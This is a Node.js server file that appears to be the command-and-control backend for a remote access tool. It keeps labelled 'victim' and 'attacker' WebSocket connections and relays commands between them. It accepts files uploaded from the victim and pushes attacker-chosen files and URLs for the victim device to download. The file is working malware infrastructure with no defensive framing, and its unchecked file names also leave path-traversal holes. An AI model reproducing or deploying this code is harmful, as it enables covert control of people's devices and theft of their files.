const fs = require('fs-extra');
const WebSocket = require('ws');
const http = require('http');
const formidable = require('formidable');
const express = require('express');
const app = express();
const config = JSON.parse(fs.readFileSync('./static/config.json'));
const clients = {
    victim: null,
    attacker: null,
    last_message: null
}

app.use('/src', (req, res, next) => {
    res.header('Cache-Control', 'no-cache, no-store, must-revalidate');
    express.static('./static/assets/public')(req, res, next);
});

app.use('/cmd', (req, res, next) => {
    res.header('Cache-Control', 'no-cache, no-store, must-revalidate');
    express.static('./static/assets/public/cmd')(req, res, next);
});

app.use('/upload', (req, res) => {
    const form = new formidable.IncomingForm();
    form.parse(req, (err, fields, files) => {
        fs.rename(files.filetoupload.path, `./static/saved/${files.filetoupload.name}`, function (err) {
            res.write('File uploaded and moved!');
            res.end();
        });
    });
});

app.use('/download/:name', (req, res) => {
    if(!fs.existsSync(`./static/download/${req.params['name']}`)) {
        res.statusCode = 404;
        return;
    }
    res.sendFile(`${__dirname}/static/download/${req.params['name']}`);
});

app.use('/sendFile', (req, res) => {
    if(!clients.victim || !req.query['url'])
        return;
    const form = new formidable.IncomingForm();
    form.parse(req, (err, fields, files) => {
        fs.rename(files.file.path, `${__dirname}/static/download/${files.file.name}`, (err) => {
            res.write('File uploaded and sent!');
            res.end();
            clients.victim.send(`{
                "platform": "web",
                "action": "download-file",
                "url": "${req.query['url']}",
                "name": "${files.file.name}"
            }`);
        });
    });
});

app.use('/*', (req, res, next) => {
    res.header('Cache-Control', 'no-cache, no-store, must-revalidate');
    express.static('./static/assets/public')(req, res, next);
});

app.use('/', (req, res, next) => {
    res.header('Cache-Control', 'no-cache, no-store, must-revalidate');
    express.static('./static/assets/public')(req, res, next);
});

const server = http.createServer({
    port: config['port']
}, app);

const ws = new WebSocket.Server({
    server: server
});

ws.on('connection', socket => {
    console.log('Client connected.');
    socket.on('message', message => {
        const data = JSON.parse(message);
        last_message = data;
        if(data['platform'] === 'app') {
            clients.victim = socket;
            if(clients.attacker)
                clients.attacker.send(message);
        } else if(data['platform'] === 'web') {
            clients.attacker = socket;
            if(clients.victim)
                clients.victim.send(message);
        }
    });
});
    
server.listen(config['port'], console.log(`Listening on port ${config['port']}.`));